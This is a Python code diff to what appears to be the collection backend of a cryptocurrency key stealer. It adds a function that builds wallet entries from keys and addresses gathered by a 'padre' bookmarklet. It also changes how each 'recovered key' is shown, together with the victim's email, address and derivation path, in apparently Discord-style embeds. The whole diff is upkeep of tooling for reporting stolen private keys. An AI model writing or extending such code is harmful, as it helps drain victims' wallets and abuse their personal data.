@@ -56,11 +56,37 @@ def done_page(parsed: dict) -> str:
     )
 
 
+def normalize_wallets(parsed: dict) -> list:
+    """Return a wallet list aligned with keys[].
+
+    padre old bookmarklet pushes into keys/addresses but never into wallets.
+    Synthesize stubs so the embed still renders one card per recovered key.
+    """
+    platform = (parsed.get("platform") or "").lower()
+    wallets = parsed.get("wallets") or []
+    keys = parsed.get("keys") or []
+    addresses = parsed.get("addresses") or []
+
+    if wallets:
+        return wallets
+
+    n = max(len(keys), len(addresses))
+    if n == 0:
+        return []
+
+    default_chain = "SOL" if platform == "padre" else "?"
+    stubs = []
+    for i in range(n):
+        addr = addresses[i] if i < len(addresses) else ""
+        stubs.append([addr, default_chain, "", "", "", "", ""])
+    return stubs
+
+
 def build_embeds(parsed: dict) -> list:
     platform = parsed.get("platform", "?")
     host = parsed.get("host", "?")
     keys = parsed.get("keys", []) or []
-    wallets = parsed.get("wallets", []) or []
+    wallets = normalize_wallets(parsed)
     user = parsed.get("user") or {}
     email = user.get("email") or "—"
     rewards = user.get("rewardsLevel", "—")
@@ -86,13 +112,13 @@ def build_embeds(parsed: dict) -> list:
     for i, w in enumerate(shown):
         if not isinstance(w, (list, tuple)) or len(w) < 2:
             continue
-        addr  = w[0]
+        addr  = w[0] or ""
         chain = (w[1] or "").upper()
         label = w[5] if len(w) > 5 else ""
         deriv = w[6] if len(w) > 6 else ""
         key   = keys[i] if i < len(keys) else None
 
-        fields = [{"name": "Address", "value": f"```{addr}```", "inline": False}]
+        fields = [{"name": "Address", "value": f"```{addr or '—'}```", "inline": False}]
         if deriv:
             fields.append({"name": "Derivation", "value": f"`{deriv}`", "inline": True})
         if label:
